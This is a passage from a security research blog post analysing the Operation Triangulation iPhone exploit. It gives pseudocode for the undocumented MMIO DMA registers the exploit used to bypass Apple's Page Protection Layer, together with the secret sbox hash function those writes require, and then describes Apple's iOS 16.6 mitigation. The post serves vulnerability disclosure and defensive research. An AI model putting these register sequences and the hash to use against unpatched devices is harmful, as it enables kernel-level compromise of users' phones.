</span><span>0x3FFFFF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x462504D2</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)</span></p><p><span>    </span><span>i</span><span> </span>=<span> </span><span>0x28</span></p><p><span>    </span><span>mask</span><span> </span>=<span> </span><span>0x3FFFFF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x07D34B9F</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_VORTEX_TEMPEST (A12)</span></p><p><span>    </span><span>i</span><span> </span>=<span> </span><span>0x28</span></p><p><span>    </span><span>mask</span><span> </span>=<span> </span><span>0x3FFFFF</span></p><p><span>dma_init</span><span>(</span><span>original_value_0x206140108</span><span>)</span></p><p><span>hash1</span><span> </span>=<span> </span><span>calculate_hash</span><span>(</span><span>data</span><span>)</span></p><p><span>hash2</span><span> </span>=<span> </span><span>calculate_hash</span><span>(</span><span>data</span>+<span>0x20</span><span>)</span></p><p><span>write_qword</span><span>(</span><span>0x206150040</span><span>,</span><span> </span><span>0x2000000</span><span> </span><span>|</span><span> </span><span>(</span><span>phys_addr</span><span> </span>&amp;<span> </span><span>0x3FC0</span><span>)</span><span>)</span></p><p><span>pos</span><span> </span>=<span> </span><span>0</span></p><p><span>while</span><span> </span><span>(</span><span>pos</span><span> </span><span>&lt;</span><span> </span><span>0x40</span><span>)</span><span>:</span></p><p><span>    </span><span>write_qword</span><span>(</span><span>0x206150048</span><span>,</span><span> </span><span>read_qword</span><span>(</span><span>data</span><span> </span>+<span> </span><span>pos</span><span>)</span><span>)</span></p><p><span>    </span><span>pos</span><span> </span>+=<span> </span><span>8</span></p><p><span>phys_addr_upper</span><span> </span>=<span> </span><span>(</span><span>(</span><span>(</span><span>(</span><span>phys_addr</span><span> </span><span>&gt;</span><span>&gt;</span><span> </span><span>14</span><span>)</span><span> </span>&amp;<span> </span><span>mask</span><span>)</span><span> </span><span>&lt;</span><span>&lt;</span><span> </span><span>18</span><span>)</span><span> </span>&amp;<span> </span><span>0x3FFFFFFFFFFFF</span><span>)</span></p><p><span>value</span><span> </span>=<span> </span><span>phys_addr_upper</span><span> </span><span>|</span><span> </span><span>(</span><span>hash1</span><span> </span><span>&lt;</span><span>&lt;</span><span> </span><span>i</span><span>)</span><span> </span><span>|</span><span> </span><span>(</span><span>hash2</span><span> </span><span>&lt;</span><span>&lt;</span><span> </span><span>50</span><span>)</span><span> </span><span>|</span><span> </span><span>0x1F</span></p><p><span>write_qword</span><span>(</span><span>0x206150048</span><span>,</span><span> </span><span>value</span><span>)</span></p><p><span>dma_done</span><span>(</span><span>original_value_0x206140108</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p><em>Pseudocode for the usage of the 0x206150040 and 0x206150048 registers by the exploit</em></p>
<p>As long as everything is done correctly, the hardware should perform a direct memory access (DMA) operation and write the data to the requested location.</p>
<p>The exploit uses this hardware feature as a Page Protection Layer (PPL) bypass, mainly for patching page table entries. It can also be used for patching the data in the protected __PPLDATA segment. The exploit does not use the feature to patch the kernel code, but once during a test, I was able to overwrite an instruction in the __TEXT_EXEC segment of the kernel and get an “Undefined Kernel Instruction” panic with the expected address and value. This only worked once—the other times I tried I got an AMCC panic. I have an idea about what I did right that one time it worked, and I am planning to look deeper into this in the future, because I think it would be really cool to take a vulnerability that was used to harm us and use it for something good, like enabling kernel debugging on new iPhones.</p>
<p>Now that all the work with all the MMIO registers has been covered, let us take a look at one last thing: how hashes are calculated. The algorithm is shown below.</p>
		<div id="crayon-658c436cedc87471921304" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p></div>
				</td>
						<td><div><p><span>sbox</span><span> </span>=<span> </span><span>[</span></p><p><span>    </span><span>0x007</span><span>,</span><span> </span><span>0x00B</span><span>,</span><span> </span><span>0x00D</span><span>,</span><span> </span><span>0x013</span><span>,</span><span> </span><span>0x00E</span><span>,</span><span> </span><span>0x015</span><span>,</span><span> </span><span>0x01F</span><span>,</span><span> </span><span>0x016</span><span>,</span></p><p><span>    </span><span>0x019</span><span>,</span><span> </span><span>0x023</span><span>,</span><span> </span><span>0x02F</span><span>,</span><span> </span><span>0x037</span><span>,</span><span> </span><span>0x04F</span><span>,</span><span> </span><span>0x01A</span><span>,</span><span> </span><span>0x025</span><span>,</span><span> </span><span>0x043</span><span>,</span><span> </span></p><p><span>    </span><span>0x03B</span><span>,</span><span> </span><span>0x057</span><span>,</span><span> </span><span>0x08F</span><span>,</span><span> </span><span>0x01C</span><span>,</span><span> </span><span>0x026</span><span>,</span><span> </span><span>0x029</span><span>,</span><span> </span><span>0x03D</span><span>,</span><span> </span><span>0x045</span><span>,</span></p><p><span>    </span><span>0x05B</span><span>,</span><span> </span><span>0x083</span><span>,</span><span> </span><span>0x097</span><span>,</span><span> </span><span>0x03E</span><span>,</span><span> </span><span>0x05D</span><span>,</span><span> </span><span>0x09B</span><span>,</span><span> </span><span>0x067</span><span>,</span><span> </span><span>0x117</span><span>,</span></p><p><span>    </span><span>0x02A</span><span>,</span><span> </span><span>0x031</span><span>,</span><span> </span><span>0x046</span><span>,</span><span> </span><span>0x049</span><span>,</span><span> </span><span>0x085</span><span>,</span><span> </span><span>0x103</span><span>,</span><span> </span><span>0x05E</span><span>,</span><span> </span><span>0x09D</span><span>,</span></p><p><span>    </span><span>0x06B</span><span>,</span><span> </span><span>0x0A7</span><span>,</span><span> </span><span>0x11B</span><span>,</span><span> </span><span>0x217</span><span>,</span><span> </span><span>0x09E</span><span>,</span><span> </span><span>0x06D</span><span>,</span><span> </span><span>0x0AB</span><span>,</span><span> </span><span>0x0C7</span><span>,</span><span> </span></p><p><span>    </span><span>0x127</span><span>,</span><span> </span><span>0x02C</span><span>,</span><span> </span><span>0x032</span><span>,</span><span> </span><span>0x04A</span><span>,</span><span> </span><span>0x051</span><span>,</span><span> </span><span>0x086</span><span>,</span><span> </span><span>0x089</span><span>,</span><span> </span><span>0x105</span><span>,</span></p><p><span>    </span><span>0x203</span><span>,</span><span> </span><span>0x06E</span><span>,</span><span> </span><span>0x0AD</span><span>,</span><span> </span><span>0x12B</span><span>,</span><span> </span><span>0x147</span><span>,</span><span> </span><span>0x227</span><span>,</span><span> </span><span>0x034</span><span>,</span><span> </span><span>0x04C</span><span>,</span></p><p><span>    </span><span>0x052</span><span>,</span><span> </span><span>0x076</span><span>,</span><span> </span><span>0x08A</span><span>,</span><span> </span><span>0x091</span><span>,</span><span> </span><span>0x0AE</span><span>,</span><span> </span><span>0x106</span><span>,</span><span> </span><span>0x109</span><span>,</span><span> </span><span>0x0D3</span><span>,</span></p><p><span>    </span><span>0x12D</span><span>,</span><span> </span><span>0x205</span><span>,</span><span> </span><span>0x22B</span><span>,</span><span> </span><span>0x247</span><span>,</span><span> </span><span>0x07A</span><span>,</span><span> </span><span>0x0D5</span><span>,</span><span> </span><span>0x153</span><span>,</span><span> </span><span>0x22D</span><span>,</span><span> </span></p><p><span>    </span><span>0x038</span><span>,</span><span> </span><span>0x054</span><span>,</span><span> </span><span>0x08C</span><span>,</span><span> </span><span>0x092</span><span>,</span><span> </span><span>0x061</span><span>,</span><span> </span><span>0x10A</span><span>,</span><span> </span><span>0x111</span><span>,</span><span> </span><span>0x206</span><span>,</span></p><p><span>    </span><span>0x209</span><span>,</span><span> </span><span>0x07C</span><span>,</span><span> </span><span>0x0BA</span><span>,</span><span> </span><span>0x0D6</span><span>,</span><span> </span><span>0x155</span><span>,</span><span> </span><span>0x193</span><span>,</span><span> </span><span>0x253</span><span>,</span><span> </span><span>0x28B</span><span>,</span></p><p><span>    </span><span>0x307</span><span>,</span><span> </span><span>0x0BC</span><span>,</span><span> </span><span>0x0DA</span><span>,</span><span> </span><span>0x156</span><span>,</span><span> </span><span>0x255</span><span>,</span><span> </span><span>0x293</span><span>,</span><span> </span><span>0x30B</span><span>,</span><span> </span><span>0x058</span><span>,</span></p><p><span>    </span><span>0x094</span><span>,</span><span> </span><span>0x062</span><span>,</span><span> </span><span>0x10C</span><span>,</span><span> </span><span>0x112</span><span>,</span><span> </span><span>0x0A1</span><span>,</span><span> </span><span>0x20A</span><span>,</span><span> </span><span>0x211</span><span>,</span><span> </span><span>0x0DC</span><span>,</span><span> </span></p><p><span>    </span><span>0x196</span><span>,</span><span> </span><span>0x199</span><span>,</span><span> </span><span>0x256</span><span>,</span><span> </span><span>0x165</span><span>,</span><span> </span><span>0x259</span><span>,</span><span> </span><span>0x263</span><span>,</span><span> </span><span>0x30D</span><span>,</span><span> </span><span>0x313</span><span>,</span></p><p><span>    </span><span>0x098</span><span>,</span><span> </span><span>0x064</span><span>,</span><span> </span><span>0x114</span><span>,</span><span> </span><span>0x0A2</span><span>,</span><span> </span><span>0x15C</span><span>,</span><span> </span><span>0x0EA</span><span>,</span><span> </span><span>0x20C</span><span>,</span><span> </span><span>0x0C1</span><span>,</span></p><p><span>    </span><span>0x121</span><span>,</span><span> </span><span>0x212</span><span>,</span><span> </span><span>0x166</span><span>,</span><span> </span><span>0x19A</span><span>,</span><span> </span><span>0x299</span><span>,</span><span> </span><span>0x265</span><span>,</span><span> </span><span>0x2A3</span><span>,</span><span> </span><span>0x315</span><span>,</span></p><p><span>    </span><span>0x0EC</span><span>,</span><span> </span><span>0x1A6</span><span>,</span><span> </span><span>0x29A</span><span>,</span><span> </span><span>0x266</span><span>,</span><span> </span><span>0x1A9</span><span>,</span><span> </span><span>0x269</span><span>,</span><span> </span><span>0x319</span><span>,</span><span> </span><span>0x2C3</span><span>,</span><span> </span></p><p><span>    </span><span>0x323</span><span>,</span><span> </span><span>0x068</span><span>,</span><span> </span><span>0x0A4</span><span>,</span><span> </span><span>0x118</span><span>,</span><span> </span><span>0x0C2</span><span>,</span><span> </span><span>0x122</span><span>,</span><span> </span><span>0x214</span><span>,</span><span> </span><span>0x141</span><span>,</span></p><p><span>    </span><span>0x221</span><span>,</span><span> </span><span>0x0F4</span><span>,</span><span> </span><span>0x16C</span><span>,</span><span> </span><span>0x1AA</span><span>,</span><span> </span><span>0x2A9</span><span>,</span><span> </span><span>0x325</span><span>,</span><span> </span><span>0x343</span><span>,</span><span> </span><span>0x0F8</span><span>,</span></p><p><span>    </span><span>0x174</span><span>,</span><span> </span><span>0x1AC</span><span>,</span><span> </span><span>0x2AA</span><span>,</span><span> </span><span>0x326</span><span>,</span><span> </span><span>0x329</span><span>,</span><span> </span><span>0x345</span><span>,</span><span> </span><span>0x383</span><span>,</span><span> </span><span>0x070</span><span>,</span></p><p><span>    </span><span>0x0A8</span><span>,</span><span> </span><span>0x0C4</span><span>,</span><span> </span><span>0x124</span><span>,</span><span> </span><span>0x218</span><span>,</span><span> </span><span>0x142</span><span>,</span><span> </span><span>0x222</span><span>,</span><span> </span><span>0x181</span><span>,</span><span> </span><span>0x241</span><span>,</span><span> </span></p><p><span>    </span><span>0x178</span><span>,</span><span> </span><span>0x2AC</span><span>,</span><span> </span><span>0x32A</span><span>,</span><span> </span><span>0x2D1</span><span>,</span><span> </span><span>0x0B0</span><span>,</span><span> </span><span>0x0C8</span><span>,</span><span> </span><span>0x128</span><span>,</span><span> </span><span>0x144</span><span>,</span></p><p><span>    </span><span>0x1B8</span><span>,</span><span> </span><span>0x224</span><span>,</span><span> </span><span>0x1D4</span><span>,</span><span> </span><span>0x182</span><span>,</span><span> </span><span>0x242</span><span>,</span><span> </span><span>0x2D2</span><span>,</span><span> </span><span>0x32C</span><span>,</span><span> </span><span>0x281</span><span>,</span></p><p><span>    </span><span>0x351</span><span>,</span><span> </span><span>0x389</span><span>,</span><span> </span><span>0x1D8</span><span>,</span><span> </span><span>0x2D4</span><span>,</span><span> </span><span>0x352</span><span>,</span><span> </span><span>0x38A</span><span>,</span><span> </span><span>0x391</span><span>,</span><span> </span><span>0x0D0</span><span>,</span></p><p><span>    </span><span>0x130</span><span>,</span><span> </span><span>0x148</span><span>,</span><span> </span><span>0x228</span><span>,</span><span> </span><span>0x184</span><span>,</span><span> </span><span>0x244</span><span>,</span><span> </span><span>0x282</span><span>,</span><span> </span><span>0x301</span><span>,</span><span> </span><span>0x1E4</span><span>,</span><span> </span></p><p><span>    </span><span>0x2D8</span><span>,</span><span> </span><span>0x354</span><span>,</span><span> </span><span>0x38C</span><span>,</span><span> </span><span>0x392</span><span>,</span><span> </span><span>0x1E8</span><span>,</span><span> </span><span>0x2E4</span><span>,</span><span> </span><span>0x358</span><span>,</span><span> </span><span>0x394</span><span>,</span></p><p><span>    </span><span>0x362</span><span>,</span><span> </span><span>0x3A1</span><span>,</span><span> </span><span>0x150</span><span>,</span><span> </span><span>0x230</span><span>,</span><span> </span><span>0x188</span><span>,</span><span> </span><span>0x248</span><span>,</span><span> </span><span>0x284</span><span>,</span><span> </span><span>0x302</span><span>,</span></p><p><span>    </span><span>0x1F0</span><span>,</span><span> </span><span>0x2E8</span><span>,</span><span> </span><span>0x364</span><span>,</span><span> </span><span>0x398</span><span>,</span><span> </span><span>0x3A2</span><span>,</span><span> </span><span>0x0E0</span><span>,</span><span> </span><span>0x190</span><span>,</span><span> </span><span>0x250</span><span>,</span></p><p><span>    </span><span>0x2F0</span><span>,</span><span> </span><span>0x288</span><span>,</span><span> </span><span>0x368</span><span>,</span><span> </span><span>0x304</span><span>,</span><span> </span><span>0x3A4</span><span>,</span><span> </span><span>0x370</span><span>,</span><span> </span><span>0x3A8</span><span>,</span><span> </span><span>0x3C4</span><span>,</span><span> </span></p><p><span>    </span><span>0x160</span><span>,</span><span> </span><span>0x290</span><span>,</span><span> </span><span>0x308</span><span>,</span><span> </span><span>0x3B0</span><span>,</span><span> </span><span>0x3C8</span><span>,</span><span> </span><span>0x3D0</span><span>,</span><span> </span><span>0x1A0</span><span>,</span><span> </span><span>0x260</span><span>,</span></p><p><span>    </span><span>0x310</span><span>,</span><span> </span><span>0x1C0</span><span>,</span><span> </span><span>0x2A0</span><span>,</span><span> </span><span>0x3E0</span><span>,</span><span> </span><span>0x2C0</span><span>,</span><span> </span><span>0x320</span><span>,</span><span> </span><span>0x340</span><span>,</span><span> </span><span>0x380</span></p><p><span>]</span></p><p><span>def </span><span>calculate_hash</span><span>(</span><span>buffer</span><span>)</span><span>:</span></p><p><span>    </span><span>acc</span><span> </span>=<span> </span><span>0</span></p><p><span>    </span><span>for</span><span> </span><span>i</span><span> </span><span>in</span><span> </span><span>range</span><span>(</span><span>8</span><span>)</span><span>:</span></p><p><span>        </span><span>pos</span><span> </span>=<span> </span><span>i *</span><span> </span><span>4</span></p><p><span>        </span><span>value</span><span> </span>=<span> </span><span>read_dword</span><span>(</span><span>buffer</span><span> </span>+<span> </span><span>pos</span><span>)</span></p><p><span>        </span><span>for</span><span> </span><span>j</span><span> </span><span>in</span><span> </span><span>range</span><span>(</span><span>32</span><span>)</span><span>:</span></p><p><span>            </span><span>if</span><span> </span><span>(</span><span>(</span><span>(</span><span>value</span><span> </span><span>&gt;</span><span>&gt;</span><span> </span><span>j</span><span>)</span><span> </span>&amp;<span> </span><span>1</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>                </span><span>acc</span><span> </span>^=<span> </span><span>sbox</span><span>[</span><span>32</span><span> </span>*<span> </span><span>i</span><span> </span>+<span> </span><span>j</span><span>]</span></p><p><span>    </span><span>return</span><span> </span><span>acc</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p><em>Pseudocode for the hash function used by this unknown hardware feature</em></p>
<p>As you can see, it is a custom algorithm, and the hash is calculated by using a predefined sbox table. I tried to search for it in a large collection of binaries, but found nothing.</p>
<p>You may notice that this hash does not look very secure, as it occupies just 20 bits (10+10, as it is calculated twice), but it does its job as long as no one knows how to calculate and use it. It is best summarized with the term “<a href="https://encyclopedia.kaspersky.com/glossary/security-by-obscurity-security-through-obscurity/?utm_source=securelist&amp;utm_medium=blog&amp;utm_campaign=termin-explanation" target="_blank" rel="noopener">security by obscurity</a>“.</p>
<p>How could attackers discover and exploit this hardware feature if it is not used and there are no instructions anywhere in the firmware on how to use it?</p>
<p>I ran one more test. I checked and found that the M1 chip inside the Mac also has this unknown hardware feature. Then I used the amazing  <a href="https://github.com/AsahiLinux/m1n1" target="_blank" rel="noopener">m1n1</a> tool to conduct an experiment. This tool has a trace_range function, which traces all access to a provided range of MMIO registers. I used it to set up tracing for the memory range 0x206110000–0x206400000, but it reported no usage of these registers by macOS.</p>
<p>Through an amazing coincidence, both my 37C3 presentation and this post discuss a vulnerability very similar to the one I talked about during my presentation at the 36th Chaos Communication Congress (36C3) in 2019.</p>
<p>In the presentation titled, “Hacking Sony PlayStation Blu-ray Drives”, I talked about how I was able to dump firmware and achieve code execution on the Blu-ray drives of Sony PlayStation 3 and 4 by using MMIO DMA registers that were accessible through SCSI commands.</p>
<p><iframe loading="lazy" width="560" height="315" src="https://www.youtube.com/embed/WW39dsbffMw?si=ZOWS4QUC-bWforF9" frameborder="0"></iframe></p>
<p>I was able to discover and exploit this vulnerability, because earlier versions of the firmware used these registers for all DRAM operations, but then Sony stopped using them and started just accessing DRAM directly, because all DRAM was also mapped to the CPU address space. Because no one was using these registers anymore and I knew how to use them, I took advantage of them. It did not need to know any secret hash algorithm.</p>
<p>Could something similar have happened in this case? I do not know that, but this GPU coprocessor first appeared in the recent Apple SoCs. In my personal opinion, based on all the information that I provided above, I highly doubt that this hardware feature was previously used for anything in retail firmware. Nevertheless, there is a possibility that it was previously revealed by mistake in some particular firmware or XNU source code release and then removed.</p>
<p>I was hoping to find out what was located inside the second unknown region from the fix for this vulnerability implemented in iOS 16.6. I was able to find out how Apple mitigated this issue, but they obfuscated the fix.</p>
<p>Apple mitigated this vulnerability by adding the MMIO ranges 0x206000000–0x206050000 and 0x206110000–0x206400000 used by the exploit to the pmap-io-ranges stored in the device tree. XNU uses the information stored there to determine whether to allow mapping of certain physical addresses. All entries stored there have a meaningful tag name that explains what kind of memory the range belongs to.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05.png" alt="" width="393" height="332" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05.png 393w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05-300x253.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05-331x280.png 331w" sizes="(max-width: 393px) 100vw, 393px"/></a></p>
<p><em>Example of entries stored in the pmap-io-ranges</em></p>
<p>Here, PCIe stands for “Peripheral Component Interconnect Express”, DART stands for “Device Address Resolution Table”, DAPF means “Device Address Filter”, and so on.</p>
<p>And here are the tag names for regions used by the exploit. They stand out from the rest.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130955/trng_final_mystery_en_06.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130955/trng_final_mystery_en_06.png" alt="" width="393" height="46" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130955/trng_final_mystery_en_06.png 393w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130955/trng_final_mystery_en_06-300x35.png 300w" sizes="(max-width: 393px) 100vw, 393px"/></a></p>
<p><em>Entries for regions used by the exploit</em></p>
<h2 id="conclusion">Conclusion</h2>
<p>This is no ordinary vulnerability, and we have many unanswered questions. We do not know how the attackers learned to use this unknown hardware feature or what its original purpose was. Neither do we know if it was developed by Apple or it’s a third-party component like ARM CoreSight.</p>
<p>What we do know—and what this vulnerability demonstrates—is that advanced hardware-based protections are useless in the face of a sophisticated attacker as long as there are hardware features that can bypass those protections.</p>
<p>Hardware security very often relies on “security through obscurity”, and it is much more difficult to reverse-engineer than software, but this is a flawed approach, because sooner or later, all secrets are revealed. Systems that rely on “security through obscurity” can never be truly secure.</p>
												</div>
											</div>
										</div>

										
				<!-- .entry-comments -->
											</div>
									<div>
																				
																					
													
					
					
		<li id="text-22">			<p><a href="https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_kas-ti_acq_ona_smm__onl_b2b_securelist_ban_sm-team______&amp;utm_source=SecureList&amp;utm_medium=sm-project&amp;utm_campaign=gl_kas-ti_le0222&amp;utm_content=banner&amp;utm_term=gl_SecureList_organic_m222khhdtozqgjr" target="_blank" rel="noopener"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/29092442/Threat-Intelligence_banner_310x420_EN.jpg" width="370"/></a></p>
		</li>
									</div>
								</div>

							</div>
						</div>

						
					</article>
				</div>
			</section>
			<section>
	
</section>
	<section data-element-id="latest-webinars-post-section">
		
	</section>
		<section data-element-id="footer-reports-section">
		<div>
			<h5>Reports</h5>
			<div>
				<div>
					<div>
																							<div>
												<article>
		<div>
		
				<p>In this report Kaspersky researchers provide an analysis of the previously unknown HrServ web shell, which exhibits both APT and crimeware features and has likely been active since 2021.</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>Asian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaigns</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>How Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.</p>
					</div>
</article>
						</div>
															</div>
				</div>
								
							</div>
		</div>
	</section>
		<section data-element-id="footer-subscribe-section">
		
	</section>
	</div></div>
  </body>
</html>
